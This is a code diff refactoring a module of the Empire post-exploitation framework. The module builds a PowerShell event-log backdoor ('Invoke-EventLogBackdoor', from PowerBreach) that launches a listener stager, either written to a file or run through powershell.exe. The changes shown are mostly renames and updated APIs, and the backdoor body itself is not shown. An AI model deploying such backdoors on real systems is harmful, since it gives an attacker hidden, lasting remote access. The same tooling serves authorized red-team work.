@@ -1,13 +1,11 @@
 from __future__ import print_function
 
 import os
-import pathlib
 from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
-from empire.server.common.module_models import PydanticModule
-from empire.server.utils import data_util
+from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
@@ -15,12 +13,11 @@ class Module(object):
     @staticmethod
     def generate(
         main_menu,
-        module: PydanticModule,
+        module: EmpireModule,
         params: Dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
-
         script = """
 function Invoke-EventLogBackdoor
 {
@@ -65,7 +62,7 @@ Invoke-EventLogBackdoor"""
 
         else:
             # set the listener value for the launcher
-            stager = main_menu.stagers.stagers["multi/launcher"]
+            stager = main_menu.stagertemplatesv2.new_instance("multi_launcher")
             stager.options["Listener"] = listener_name
             stager.options["Base64"] = "False"
 
@@ -90,20 +87,20 @@ Invoke-EventLogBackdoor"""
                     else:
                         script += " -" + str(option) + " " + str(values)
 
-        outFile = params["OutFile"]
-        if outFile != "":
+        out_file = params["OutFile"]
+        if out_file != "":
             # make the base directory if it doesn't exist
             if (
-                not os.path.exists(os.path.dirname(outFile))
-                and os.path.dirname(outFile) != ""
+                not os.path.exists(os.path.dirname(out_file))
+                and os.path.dirname(out_file) != ""
             ):
-                os.makedirs(os.path.dirname(outFile))
+                os.makedirs(os.path.dirname(out_file))
 
             with open(out_file, "w") as f:
                 f.write(script)
 
             return handle_error_message(
-                "[+] PowerBreach deaduser backdoor written to " + outFile
+                "[+] PowerBreach deaduser backdoor written to " + out_file
             )
 
         # transform the backdoor into something launched by powershell.exe
@@ -119,7 +116,7 @@ Invoke-EventLogBackdoor"""
             % (parts[0], " ".join(parts[1:]))
         )
 
-        script = main_menu.modules.finalize_module(
+        script = main_menu.modulesv2.finalize_module(
             script=script,
             script_end="",
             obfuscate=obfuscate,
